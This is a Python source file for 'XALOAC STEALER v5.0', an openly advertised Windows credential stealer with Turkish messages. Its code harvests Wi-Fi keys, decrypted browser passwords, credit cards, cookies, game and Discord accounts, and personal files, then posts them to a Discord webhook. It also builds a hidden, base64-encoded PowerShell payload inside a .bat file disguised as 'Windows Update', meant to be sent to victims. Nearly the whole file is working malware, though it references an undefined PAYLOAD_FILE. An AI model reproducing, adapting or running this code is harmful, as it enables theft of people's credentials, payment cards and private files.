#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║     XALOAC STEALER v5.0 - WINDOWS COMPLETE                  ║
║     Ana Program - python xaloac.py                          ║
╚══════════════════════════════════════════════════════════════╝
"""

import os, sys, time, subprocess, socket, getpass, platform, json
import base64, zipfile, shutil, sqlite3, re, requests, tempfile
from datetime import datetime
from pathlib import Path

def banner():
    os.system('cls')
    print("""
\033[95m
    ██╗  ██╗ █████╗ ██╗      ██████╗  █████╗  ██████╗
    ╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██╔══██╗██╔════╝
     ╚███╔╝ ███████║██║     ██║   ██║███████║██║     
     ██╔██╗ ██╔══██║██║     ██║   ██║██╔══██║██║     
    ██╔╝ ██╗██║  ██║███████╗╚██████╔╝██║  ██║╚██████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝
\033[0m
\033[91m    Author: x410m1s0\033[0m
\033[92m    Version: 5.0 | Windows Complete Edition\033[0m
\033[93m    No Server Needed | All Data to Discord\033[0m
\033[96m    ═══════════════════════════════════════════════\033[0m
    """)

# ============================================================
# AYARLAR
# ============================================================
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")
VICTIMS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "victims")
TEMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")

os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(VICTIMS_DIR, exist_ok=True)
os.makedirs(TEMP_DIR, exist_ok=True)

# ============================================================
# STEALER SINIFI
# ============================================================

class Stealer:
    def __init__(self):
        self.computer = os.environ.get("COMPUTERNAME", "UNKNOWN")
        self.user = getpass.getuser()
        self.ip = self._get_ip()
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.victim_dir = os.path.join(VICTIMS_DIR, f"{self.computer}_{self.user}_{self.timestamp}")
        os.makedirs(self.victim_dir, exist_ok=True)
        
        self.passwords = []
        self.wifi = []
        self.games = {}
        self.cookies = []
        self.cards = []
        self.system_info = {}
        self.files_stolen = 0
        self.total_size = 0
    
    def _get_ip(self):
        try:
            return requests.get("https://api.ipify.org", timeout=5).text.strip()
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "Unknown"
    
    def _decrypt(self, encrypted_value):
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except:
            return None
    
    def _copy_db(self, path):
        if not os.path.exists(path):
            return None
        tmp = os.path.join(TEMP_DIR, os.path.basename(path) + "_" + str(int(time.time())))
        shutil.copy2(path, tmp)
        return tmp

    def collect_system_info(self):
        info = {
            "computer": self.computer,
            "user": self.user,
            "ip": self.ip,
            "os": platform.system() + " " + platform.version(),
            "processor": platform.processor(),
            "architecture": platform.architecture()[0],
            "hostname": socket.gethostname(),
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        try:
            hwid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode()
            info["hwid"] = hwid.split("\n")[1].strip() if len(hwid.split("\n")) > 1 else "N/A"
        except:
            info["hwid"] = "N/A"
        
        try:
            output = subprocess.check_output("wmic os get lastbootuptime", shell=True).decode()
            info["last_boot"] = output.split("\n")[1].strip() if len(output.split("\n")) > 1 else "N/A"
        except:
            info["last_boot"] = "N/A"
        
        self.system_info = info
        
        with open(os.path.join(self.victim_dir, "system_info.json"), "w", encoding="utf-8") as f:
            json.dump(info, f, indent=2, ensure_ascii=False)
        
        print(f"\033[92m    [+] Sistem bilgisi toplandi\033[0m")
    
    def collect_wifi(self):
        try:
            output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
            profiles = []
            for line in output.split("\n"):
                if ":" in line and "profil" not in line.lower():
                    name = line.split(":")[1].strip()
                    if name:
                        profiles.append(name)
            
            for profile in set(profiles):
                try:
                    result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                    for line in result.split("\n"):
                        if "Key Content" in line or "Anahtar Icerigi" in line:
                            pw = line.split(":")[1].strip()
                            self.wifi.append({"ssid": profile, "password": pw})
                            break
                except:
                    pass
            
            with open(os.path.join(self.victim_dir, "wifi_passwords.txt"), "w", encoding="utf-8") as f:
                for w in self.wifi:
                    f.write(f"{w['ssid']}: {w['password']}\n")
            
            print(f"\033[92m    [+] {len(self.wifi)} WiFi sifresi bulundu\033[0m")
        except:
            pass
    
    def collect_browsers(self):
        browsers = [
            ("Chrome", os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")),
            ("Edge", os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")),
            ("Brave", os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")),
            ("Opera", os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable")),
            ("Vivaldi", os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data")),
        ]
        
        browser_files = []
        
        for name, base_path in browsers:
            if not os.path.exists(base_path):
                continue
            
            for profile in ["Default", "Profile 1", "Profile 2"]:
                profile_path = os.path.join(base_path, profile)
                login_db = os.path.join(profile_path, "Login Data")
                
                if os.path.exists(login_db):
                    db = self._copy_db(login_db)
                    if db:
                        try:
                            conn = sqlite3.connect(db)
                            c = conn.cursor()
                            c.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for url, user, pw in c.fetchall():
                                dec = self._decrypt(pw)
                                if dec and user:
                                    self.passwords.append(f"[{name}] {url} | {user} | {dec}")
                            conn.close()
                        except:
                            pass
                        browser_files.append(db)
                
                # Web Data (kredi karti)
                webdata = os.path.join(profile_path, "Web Data")
                if os.path.exists(webdata):
                    db = self._copy_db(webdata)
                    if db:
                        try:
                            conn = sqlite3.connect(db)
                            c = conn.cursor()
                            c.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                            for name, month, year, num in c.fetchall():
                                dec = self._decrypt(num)
                                if dec:
                                    self.cards.append(f"[{name}] {name} | {month}/{year} | {dec}")
                            conn.close()
                        except:
                            pass
                        browser_files.append(db)
                
                # Cookies
                cookie_db = os.path.join(profile_path, "Network", "Cookies")
                if os.path.exists(cookie_db):
                    db = self._copy_db(cookie_db)
                    if db:
                        browser_files.append(db)
        
        with open(os.path.join(self.victim_dir, "passwords.txt"), "w", encoding="utf-8") as f:
            for p in self.passwords:
                f.write(p + "\n")
        
        with open(os.path.join(self.victim_dir, "credit_cards.txt"), "w", encoding="utf-8") as f:
            for c in self.cards:
                f.write(c + "\n")
        
        if browser_files:
            zip_path = os.path.join(self.victim_dir, "browser_data.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for f in browser_files:
                    zf.write(f, os.path.basename(f))
            
            for f in browser_files:
                try:
                    os.remove(f)
                except:
                    pass
        
        print(f"\033[92m    [+] {len(self.passwords)} sifre bulundu\033[0m")
        print(f"\033[92m    [+] {len(self.cards)} kredi karti bulundu\033[0m")
    
    def collect_games(self):
        # Steam
        for sp in [r"C:\Program Files (x86)\Steam\config\loginusers.vdf", 
                   os.path.expandvars(r"%PROGRAMFILES(X86)%\Steam\config\loginusers.vdf")]:
            if os.path.exists(sp):
                try:
                    with open(sp, "r", errors="ignore") as f:
                        content = f.read()
                    users = re.findall(r'"AccountName"\s+"([^"]+)"', content)
                    if users:
                        self.games["Steam"] = list(set(users))
                    break
                except:
                    pass
        
        # Epic Games
        epic_path = os.path.expandvars(r"%LOCALAPPDATA%\EpicGamesLauncher\Saved\Config\Windows\GameUserSettings.ini")
        if os.path.exists(epic_path):
            try:
                with open(epic_path, "r") as f:
                    content = f.read()
                users = re.findall(r'LastLoggedInUser=(.+)', content)
                if users:
                    self.games["EpicGames"] = users
            except:
                pass
        
        # Minecraft
        for mc in [os.path.expandvars(r"%APPDATA%\.minecraft\launcher_accounts.json"),
                   os.path.expandvars(r"%APPDATA%\.minecraft\launcher_profiles.json")]:
            if os.path.exists(mc):
                try:
                    with open(mc, "r") as f:
                        data = json.load(f)
                    mc_accounts = []
                    for acc in data.get("accounts", {}).values():
                        mc_accounts.append(f"{acc.get('username','?')} ({acc.get('email','?')})")
                    if mc_accounts:
                        self.games["Minecraft"] = mc_accounts
                    break
                except:
                    pass
        
        # Riot Games (Valorant, LoL)
        riot_path = os.path.expandvars(r"%LOCALAPPDATA%\Riot Games\Riot Client\Config")
        if os.path.exists(riot_path):
            try:
                riot_users = []
                for root, dirs, files in os.walk(riot_path):
                    for file in files:
                        if file.endswith(".yml") or file.endswith(".yaml"):
                            with open(os.path.join(root, file), "r", errors="ignore") as f:
                                content = f.read()
                            found = re.findall(r'username:\s*(.+)', content)
                            riot_users.extend([u.strip() for u in found])
                if riot_users:
                    self.games["RiotGames"] = list(set(riot_users))
            except:
                pass
        
        # Ubisoft
        ubi = os.path.expandvars(r"%LOCALAPPDATA%\Ubisoft Game Launcher\settings.yml")
        if os.path.exists(ubi):
            try:
                with open(ubi, "r") as f:
                    content = f.read()
                users = re.findall(r'username:\s*"?(.+?)"?\s*$', content, re.MULTILINE)
                if users:
                    self.games["Ubisoft"] = users
            except:
                pass
        
        # Origin/EA
        origin = os.path.expandvars(r"%APPDATA%\Origin\local.xml")
        if os.path.exists(origin):
            try:
                with open(origin, "r") as f:
                    content = f.read()
                users = re.findall(r'<Setting key="Username"[^>]*>(.+?)</Setting>', content)
                if users:
                    self.games["Origin"] = users
            except:
                pass
        
        # Battle.net
        bnet = os.path.expandvars(r"%APPDATA%\Battle.net\Battle.net.config")
        if os.path.exists(bnet):
            try:
                with open(bnet, "r") as f:
                    content = f.read()
                users = re.findall(r'"account"\s*:\s*"(.+?)"', content)
                if users:
                    self.games["BattleNet"] = users
            except:
                pass
        
        # FiveM
        if os.path.exists(os.path.expandvars(r"%LOCALAPPDATA%\FiveM\FiveM.app")):
            self.games["FiveM"] = ["Installed"]
        
        # Discord
        disc_path = os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb")
        if os.path.exists(disc_path):
            try:
                emails = []
                for file in os.listdir(disc_path):
                    if file.endswith(".ldb"):
                        with open(os.path.join(disc_path, file), "r", errors="ignore") as f:
                            content = f.read()
                        found = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', content)
                        emails.extend([e for e in found if "discord" not in e.lower() and "facebook" not in e.lower()])
                if emails:
                    self.games["Discord_Emails"] = list(set(emails))
            except:
                pass
        
        with open(os.path.join(self.victim_dir, "game_accounts.txt"), "w", encoding="utf-8") as f:
            for platform, accounts in self.games.items():
                if isinstance(accounts, list):
                    f.write(f"{platform}: {', '.join(accounts)}\n")
                else:
                    f.write(f"{platform}: {accounts}\n")
        
        print(f"\033[92m    [+] {len(self.games)} oyun platformu bulundu\033[0m")
    
    def collect_files(self):
        extensions = [
            ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
            ".mp3", ".mp4", ".avi", ".mov", ".wmv", ".mkv",
            ".zip", ".rar", ".7z", ".tar", ".gz",
            ".py", ".js", ".html", ".css", ".php", ".java", ".cpp", ".c", ".cs",
            ".json", ".xml", ".csv", ".ini", ".cfg", ".conf", ".config",
            ".sql", ".db", ".sqlite", ".mdb",
            ".key", ".pem", ".crt", ".cer", ".p12", ".pfx",
            ".env", ".htpasswd", ".log", ".dat", ".bak", ".old",
            ".psd", ".ai", ".svg", ".sketch",
        ]
        
        targets = [
            os.path.expandvars(r"%USERPROFILE%\Desktop"),
            os.path.expandvars(r"%USERPROFILE%\Documents"),
            os.path.expandvars(r"%USERPROFILE%\Pictures"),
            os.path.expandvars(r"%USERPROFILE%\Downloads"),
            os.path.expandvars(r"%USERPROFILE%\Videos"),
        ]
        
        files_to_zip = []
        total = 0
        max_size = 50 * 1024 * 1024
        
        for target in targets:
            if not os.path.exists(target):
                continue
            for root, dirs, files in os.walk(target):
                for file in files:
                    if total >= max_size:
                        break
                    ext = os.path.splitext(file)[1].lower()
                    if ext in extensions:
                        fp = os.path.join(root, file)
                        try:
                            size = os.path.getsize(fp)
                            if size < 5 * 1024 * 1024 and size > 0:
                                files_to_zip.append(fp)
                                total += size
                        except:
                            pass
        
        if files_to_zip:
            zip_path = os.path.join(self.victim_dir, "stolen_files.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for f in files_to_zip:
                    try:
                        zf.write(f, os.path.basename(f))
                        self.files_stolen += 1
                        self.total_size += os.path.getsize(f)
                    except:
                        pass
        
        print(f"\033[92m    [+] {self.files_stolen} dosya calindi ({self.total_size/1024/1024:.1f} MB)\033[0m")
    
    def send_to_discord(self, webhook):
        if not webhook:
            return
        
        try:
            # Sistem özeti
            info = self.system_info
            msg = f"🖥️ **YENI KURBAN**\n```\nBilgisayar: {info.get('computer')}\nKullanici: {info.get('user')}\nIP: {info.get('ip')}\nHWID: {info.get('hwid')}\nOS: {info.get('os')}\nSaat: {info.get('time')}\n```"
            requests.post(webhook, json={"content": msg}, timeout=10)
            
            # WiFi
            if self.wifi:
                wmsg = "📶 **WIFI SIFRELERI**\n```\n" + "\n".join([f"{w['ssid']}: {w['password']}" for w in self.wifi[:20]]) + "\n```"
                requests.post(webhook, json={"content": wmsg[:1900]}, timeout=10)
            
            # Sifreler
            if self.passwords:
                for i in range(0, len(self.passwords), 20):
                    chunk = self.passwords[i:i+20]
                    pmsg = "🔑 **SIFRELER**\n```\n" + "\n".join(chunk) + "\n```"
                    requests.post(webhook, json={"content": pmsg[:1900]}, timeout=10)
            
            # Kredi karti
            if self.cards:
                cmsg = "💳 **KREDI KARTLARI**\n```\n" + "\n".join(self.cards) + "\n```"
                requests.post(webhook, json={"content": cmsg[:1900]}, timeout=10)
            
            # Oyunlar
            if self.games:
                gmsg = "🎮 **OYUN HESAPLARI**\n```\n"
                for p, a in self.games.items():
                    gmsg += f"{p}: {a}\n"
                gmsg += "```"
                requests.post(webhook, json={"content": gmsg[:1900]}, timeout=10)
            
            # Dosya özeti
            if self.files_stolen > 0:
                requests.post(webhook, json={"content": f"📁 **DOSYALAR**: {self.files_stolen} dosya calindi ({self.total_size/1024/1024:.1f} MB)\nKlasor: {self.victim_dir}"}, timeout=10)
            
        except:
            pass
    
    def cleanup(self):
        try:
            shutil.rmtree(TEMP_DIR, ignore_errors=True)
        except:
            pass
    
    def run_all(self, webhook=""):
        print(f"\n\033[96m    [*] Bilgiler toplaniyor...\033[0m\n")
        
        self.collect_system_info()
        self.collect_wifi()
        self.collect_browsers()
        self.collect_games()
        self.collect_files()
        self.send_to_discord(webhook)
        self.cleanup()
        
        print(f"\n\033[92m    [+] TUM BILGILER TOPLANDI!\033[0m")
        print(f"\033[92m    [+] Klasor: {self.victim_dir}\033[0m")
        print(f"\033[96m    ├── system_info.json\033[0m")
        print(f"\033[96m    ├── wifi_passwords.txt\033[0m")
        print(f"\033[96m    ├── passwords.txt\033[0m")
        if self.cards:
            print(f"\033[96m    ├── credit_cards.txt\033[0m")
        print(f"\033[96m    ├── game_accounts.txt\033[0m")
        if os.path.exists(os.path.join(self.victim_dir, "browser_data.zip")):
            print(f"\033[96m    ├── browser_data.zip\033[0m")
        if os.path.exists(os.path.join(self.victim_dir, "stolen_files.zip")):
            print(f"\033[96m    └── stolen_files.zip\033[0m")


# ============================================================
# PAYLOAD OLUŞTURUCU
# ============================================================

def build_payload(webhook):
    ps = f'''$ErrorActionPreference="SilentlyContinue";$ProgressPreference="SilentlyContinue";[Console]::Title="Windows Update"
$d="{webhook}"
function dm($m){{try{{if($m.Length -gt 1900){{$m=$m.Substring(0,1900)}}$bd=@{{content=$m}}|ConvertTo-Json;Invoke-RestMethod -Uri $d -Method Post -Body $bd -ContentType "application/json"}}catch{{}}}}

$cn=$env:COMPUTERNAME;$un=$env:USERNAME
$os=(Get-WmiObject Win32_OperatingSystem).Caption
$hw=try{{(Get-WmiObject Win32_ComputerSystemProduct).UUID}}catch{{"N/A"}}
$cp=try{{(Get-WmiObject Win32_Processor).Name}}catch{{"N/A"}}
$rm=try{{[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)}}catch{{0}}
$gp=try{{(Get-WmiObject Win32_VideoController)[0].Name}}catch{{"N/A"}}
try{{$ip=(Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content.Trim()}}catch{{$ip="N/A"}}
try{{$geo=(Invoke-WebRequest -Uri "http://ip-api.com/json/$ip" -UseBasicParsing -TimeoutSec 5).Content|ConvertFrom-Json}}catch{{}}
$tm=Get-Date -Format "yyyy-MM-dd HH:mm:ss"
dm "NEW VICTIM: $cn | $un | $ip | $($geo.country)/$($geo.city)"

$wifi=@()
try{{$pr=@();$rw=netsh wlan show profiles;foreach($l in($rw -split"`n")){{if($l -match":" -and $l -notmatch"Profil|profil"){{$n=($l -split":",2)[1].Trim();if($n){{$pr+=$n}}}}}}$pr=$pr|Select-Object -Unique;foreach($p in $pr){{$dt=netsh wlan show profile "$p" key=clear;$pw=$dt|Select-String "Anahtar Icerigi|Key Content";if($pw){{$ps=($pw -split":",2)[1].Trim();$wifi+=@{{"ssid"=$p;"password"=$ps}}}}}}}}catch{{}}
if($wifi.Count -gt 0){{$ws=($wifi|ForEach-Object{{"$($_.ssid):$($_.password)"}}|Out-String);dm "WIFI:`n$ws"}}

$br=@(@{{N="Chrome";P="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"}},@{{N="Edge";P="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"}},@{{N="Brave";P="$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data"}},@{{N="Opera";P="$env:APPDATA\\Opera Software\\Opera Stable"}},@{{N="Vivaldi";P="$env:LOCALAPPDATA\\Vivaldi\\User Data"}})
foreach($b in $br){{if(-not(Test-Path $b.P)){{continue}}try{{$fl=@();Get-ChildItem $b.P -Recurse -Include "Login Data","Cookies","Web Data","History" -ErrorAction SilentlyContinue|ForEach-Object{{if($_.Length -lt 10MB){{$fl+=$_.FullName}}}};if($fl.Count -gt 0){{$z="$env:TEMP\\$($b.N).zip";Compress-Archive -Path $fl -DestinationPath $z -Force;dm "BROWSER: $($b.N) DB copied"}}}}catch{{}}}}

$gm=@()
foreach($s in @("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf","$env:ProgramFiles(x86)\\Steam\\config\\loginusers.vdf")){{if(Test-Path $s){{try{{$c=Get-Content $s -Raw;$m=[regex]::Matches($c,'"AccountName"\\s+"([^"]+)"');if($m.Count -gt 0){{$a=@();foreach($x in $m){{$a+=$x.Groups[1].Value}};$gm+=@{{"platform"="Steam";"accounts"=$a}}}}}}catch{{}};break}}}}
$ep="$env:LOCALAPPDATA\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini";if(Test-Path $ep){{try{{$c=Get-Content $ep -Raw;$m=[regex]::Matches($c,'LastLoggedInUser=(.+)');if($m.Count -gt 0){{$gm+=@{{"platform"="Epic";"accounts"=@($m.Groups[1].Value)}}}}}}catch{{}}}}
foreach($mp in @("$env:APPDATA\\.minecraft\\launcher_accounts.json","$env:APPDATA\\.minecraft\\launcher_profiles.json")){{if(Test-Path $mp){{try{{$d=Get-Content $mp -Raw|ConvertFrom-Json;$a=@();foreach($x in $d.accounts.PSObject.Properties){{$un=if($x.Value.username){{$x.Value.username}}else{{"?"}};$em=if($x.Value.email){{$x.Value.email}}else{{"?"}};$a+="$un ($em)"}};if($a.Count -gt 0){{$gm+=@{{"platform"="Minecraft";"accounts"=$a}}}}}}catch{{}};break}}}}
$rt="$env:LOCALAPPDATA\\Riot Games\\Riot Client\\Config";if(Test-Path $rt){{try{{$a=@();Get-ChildItem $rt -Recurse -Include "*.yml","*.yaml" -ErrorAction SilentlyContinue|ForEach-Object{{$c=Get-Content $_.FullName -Raw;$m=[regex]::Matches($c,'username:\\s*(.+)');foreach($x in $m){{$a+=$x.Groups[1].Value.Trim()}}}};if($a.Count -gt 0){{$gm+=@{{"platform"="Riot";"accounts"=$a}}}}}}catch{{}}}}
if(Test-Path "$env:LOCALAPPDATA\\FiveM\\FiveM.app"){{$gm+=@{{"platform"="FiveM";"accounts"=@("Installed")}}}}
if($gm.Count -gt 0){{$gs=($gm|ForEach-Object{{"$($_.platform): $($_.accounts -join ', ')"}}|Out-String);dm "GAMES:`n$gs"}}

$td=@("$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Pictures","$env:USERPROFILE\\Downloads")
$ex=@("*.jpg","*.jpeg","*.png","*.gif","*.bmp","*.txt","*.pdf","*.doc","*.docx","*.xls","*.xlsx","*.csv","*.json","*.xml","*.cfg","*.conf","*.sql","*.db","*.mp3","*.mp4","*.zip","*.rar","*.py","*.js","*.html","*.php","*.env","*.key","*.pem","*.log","*.dat")
$fl=@();$ts=0;$mx=50MB
foreach($d in $td){{if(-not(Test-Path $d)){{continue}}foreach($e in $ex){{if($ts -ge $mx){{break}}Get-ChildItem $d -Recurse -Filter $e -ErrorAction SilentlyContinue|Where-Object{{$_.Length -lt 5MB -and $_.Length -gt 0}}|ForEach-Object{{if($ts -ge $mx){{return}}$script:fl+=$_.FullName;$script:ts+=$_.Length}}}}}}
if($fl.Count -gt 0){{$z="$env:TEMP\\files.zip";Compress-Archive -Path $fl -DestinationPath $z -CompressionLevel Fastest -Force;dm "FILES: $($fl.Count) files stolen"}}

Get-ChildItem $env:TEMP -Filter "*.zip" -ErrorAction SilentlyContinue|Remove-Item -Force -ErrorAction SilentlyContinue
dm "DONE: $cn - $ip"
'''
    return ps


# ============================================================
# ANA PROGRAM
# ============================================================

def main():
    banner()
    
    print("\033[96m    [SECENEKLER]\033[0m\n")
    print("    \033[93m[1]\033[0m Kendi bilgisayarinda calistir (bilgileri topla)")
    print("    \033[93m[2]\033[0m Kurban icin .bat dosyasi olustur (Discord'a gonderir)")
    print("    \033[93m[3]\033[0m Ikisi birden\n")
    
    choice = input("    Secim (1/2/3): ").strip()
    
    if choice == "1":
        print("\n    Discord Webhook (opsiyonel, Enter ile gec):")
        webhook = input("    Webhook URL: ").strip()
        s = Stealer()
        s.run_all(webhook)
    
    elif choice in ["2", "3"]:
        print("\n\033[96m    [DISCORD WEBHOOK]\033[0m")
        print("    Discord Sunucusu > Ayarlar > Entegrasyonlar > Webhook Olustur > URL Kopyala\n")
        webhook = input("    Webhook URL: ").strip()
        
        if not webhook or "discord.com/api/webhooks/" not in webhook:
            print("\n\033[91m    [!] Gecerli bir Discord Webhook URL'si girin!\033[0m")
            return
        
        print("\n\033[96m    [*] Payload olusturuluyor...\033[0m")
        ps = build_payload(webhook)
        enc = base64.b64encode(ps.encode('utf-16le')).decode()
        cmd = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand ' + enc
        
        bat = '@echo off\r\ntitle Windows Update\r\necho Windows Guncellestirmesi Baslatiliyor...\r\necho Lutfen bekleyin...\r\ntimeout /t 3 >nul\r\n' + cmd + '\r\ntimeout /t 2 >nul\r\necho Tamamlandi!\r\nexit\r\n'
        
        with open(PAYLOAD_FILE, 'w', encoding='utf-8') as f:
            f.write(bat)
        
        print(f"\n\033[92m    [+] .bat dosyasi: {PAYLOAD_FILE}\033[0m")
        print(f"\033[92m    [+] Kurbana gonder ve calistir.\033[0m")
        print(f"\033[92m    [+] Bilgiler Discord'a gonderilecek.\033[0m")
        
        if choice == "3":
            print(f"\n\033[96m    [*] Kendi bilgilerin de toplaniyor...\033[0m")
            s = Stealer()
            s.run_all(webhook)
    
    else:
        print("\n\033[91m    [!] Gecersiz secim!\033[0m")
    
    print(f"\n\033[96m    Cikmak icin bir tusa bas...\033[0m")
    input()

if __name__ == "__main__":
    try:
        import win32crypt
    except:
        print("\n\033[93m    [!] pywin32 yuklu degil. Sifreler cozulemez.\033[0m")
        print("    pip install pywin32")
    main()